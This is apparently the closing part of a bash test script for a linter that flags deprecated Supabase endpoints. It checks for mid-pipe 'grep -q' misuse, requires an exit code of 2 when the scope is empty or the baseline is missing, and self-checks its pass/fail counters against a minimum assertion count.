for f in "$GUARD" "${BASH_SOURCE[0]}"; do
  n="$(grep -vE '^[[:space:]]*#' "$f" | grep -cE '\|[[:space:]]*grep[[:space:]]+-[A-Za-z]*q' || true)"
  [[ "$n" =~ ^[0-9]+$ ]] || n=0
  if [[ "$n" -gt 0 ]]; then
    qpipe_hits=$((qpipe_hits + n))
    echo "  $f: $n mid-pipe \`grep -q\` line(s):" >&2
    grep -nvE '^[[:space:]]*#' "$f" | grep -E '\|[[:space:]]*grep[[:space:]]+-[A-Za-z]*q' >&2 || true
  fi
done
if [[ "$qpipe_hits" -eq 0 ]]; then pass; else
  fail "row 10: $qpipe_hits mid-pipe \`grep -q\` construct(s). Under pipefail a match SIGPIPEs the producer and the pipeline reports failure, so the guarded assignment silently does not happen. Use a herestring — it has no producer process to signal."
fi

# ── Hard errors: the two ways this guard must refuse to certify anything ───────────────
# 1. Scope loss. An empty assembly and a clean repo must not produce the same answer.
T8="$(new_tree empty)"
mkdir -p "$T8/scripts" || setup_die "mkdir T8 failed"
printf '#!/usr/bin/env bash\necho hello\n' > "$T8/scripts/unrelated.sh" || setup_die "write unrelated.sh failed"
seal "$T8"
run_guard "$GUARD" "$T8" "$HW"
if [[ "$RC" -eq 2 ]] && out_has 'enumerated 0 files'; then pass; else
  fail "scope loss must be exit 2, not a green zero. rc=$RC, output: $(cat "$OUT")"
fi
# 2. Missing baseline. A ratchet whose baseline vanished would certify any population at all.
run_guard "$GUARD" "$T7" "$WORK/does-not-exist.hw"
if [[ "$RC" -eq 2 ]] && out_has 'is missing'; then pass; else
  fail "a missing .highwater must be exit 2, never a pass. rc=$RC, output: $(cat "$OUT")"
fi

# ── The live tree is green ─────────────────────────────────────────────────────────────
run_guard "$GUARD" "$REPO_ROOT" "$REPO_ROOT/scripts/lint-supabase-deprecated-endpoints.highwater"
if [[ "$RC" -eq 0 ]]; then pass; else fail "the live repo is not green against its committed baseline. rc=$RC, output: $(cat "$OUT")"; fi

# ── HARNESS SELF-CHECK ────────────────────────────────────────────────────────────────
# The cardinality floor below sees assertions that RAN; it cannot see pass()/fail() having
# been neutered. Prove the reporters still move their own counters, then subtract the probes.
_p0=$passes; _f0=$fails
pass
fail "__self-check (expected; not a real failure)" 2>/dev/null
if [[ $((passes - _p0)) -ne 1 || $((fails - _f0)) -ne 1 ]]; then
  echo "FAIL: pass()/fail() are not discriminating (+$((passes - _p0))/+$((fails - _f0)); expected +1/+1)." >&2
  exit 1
fi
passes=$_p0; fails=$_f0
pass

echo "lint-supabase-deprecated-endpoints: $passes passed, $fails failed"

# MINIMUM CARDINALITY. Neutering pass()/fail() yields "0 passed, 0 failed" and exit 0, and a
# runner reads only the exit code. Set to the FULL count of a green run, not a slack value: a
# floor left trailing its population lets the newest assertion be deleted unnoticed. It stays
# `-lt` (a floor, never `-eq`) so ADDING assertions is free; only deletion reds.
MIN_ASSERTIONS=45
if [[ $((passes + fails)) -lt "$MIN_ASSERTIONS" ]]; then
  echo "FAIL: only $((passes + fails)) assertions ran, expected >= ${MIN_ASSERTIONS}. An empty or unreadable fixture source must not exit 0 with zero coverage." >&2
  exit 1
fi
[[ "$fails" -eq 0 ]]
